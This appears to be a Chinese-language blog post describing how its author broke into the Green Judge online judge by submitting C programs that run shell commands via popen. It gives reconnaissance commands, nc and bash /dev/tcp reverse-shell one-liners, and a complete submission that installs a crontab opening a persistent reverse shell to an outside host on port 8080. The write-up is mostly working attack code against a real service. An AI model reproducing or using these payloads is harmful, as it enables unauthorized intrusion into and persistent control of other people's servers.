---
layout: default
---

# Green Judge backdoor
## 序言

反正這個後門是我學長告訴我說，Green Judge之前有一個沒封過的後門

然後依照我就去找了以下他的system function可用的只有popen（我沒測過別的可用的）

花了一個學期我學會了很多系統的技巧我才成功開後門進去

## 實作 

依照我原本測試的popen只要這樣就能寫入指令

```c
#include <stdio.h>
#include <string.h>

int main(void) {
	//shell command
	char* command=(char*)"echo test";

	popen(command, "r");

	return 0;
};
```

然而要print &1的話...

```c
#include <stdio.h>
#include <string.h>

#define COMMAND_LENTH 32
int main(void) {
	char CMBuf[ COMMAND_LENTH ]={0};
	FILE *fpRead;
	
	//shell command
	char* command=(char*)"echo Hello!";
	char* renewCh;

	fpRead = popen(command, "r");
	fgets(CMBuf, COMMAND_LENTH , fpRead);
	
	if(fpRead != NULL)
		pclose(fpRead);

	renewCh=strstr(CMBuf,"\n");
	if(renewCh)
		*renewCh= '\0';
	printf("%s\n", CMBuf);
	
	return 0;
};
```

這樣甚至可以解第一題Hello!

### 收集資訊

uname:FreeBSD

id:tomcat staff

pwd:/root

ls:無法顯示

passwd:無法完整顯示

which nc:/usr/local/bin/nc

### reverse shell

開始測試reverse shell

```sh
nc -c /bin/sh ip port
```

然後我回想到FreeBSD不能使用nc -c

只好使用bash tcp 傳送了

```sh
/usr/local/bin/bash -c '/usr/local/bin/bash -i >& /dev/tcp/myip/port 0>&1'
```

結果他測資有時間限制所以CE= =

過了一個月我才想到user本身有crontab的權限

然而FreeBSD的語法不允許pipeline進去

所以用寫入的方式，結果我又忘記/root正常沒有寫入權限

所以最終結果長這個樣子

```c
#include <stdio.h>
#include <string.h>

#define COMMAND_LENTH 32
int main(void) {
	char CMBuf[ COMMAND_LENTH ]={0};
	FILE *fpRead;
	
	//shell command
	char* command=(char*)"echo \"* * * * *  /usr/local/bin/bash -c \'/usr/local/bin/bash -i >& /dev/tcp/cnmc.tw/8080 0>&1\'\">/home/tomcat/backdoor;crontab /home/tomcat/backdoor&&echo Hello!";
	char* renewCh;

	fpRead = popen(command, "r");
	fgets(CMBuf, COMMAND_LENTH , fpRead);
	
	if(fpRead != NULL)
		pclose(fpRead);

	renewCh=strstr(CMBuf,"\n");
	if(renewCh)
		*renewCh= '\0';
	printf("%s\n", CMBuf);
	
	return 0;
};
```

### 提權

待補

而且我發現已經有人進去過ㄌQQ
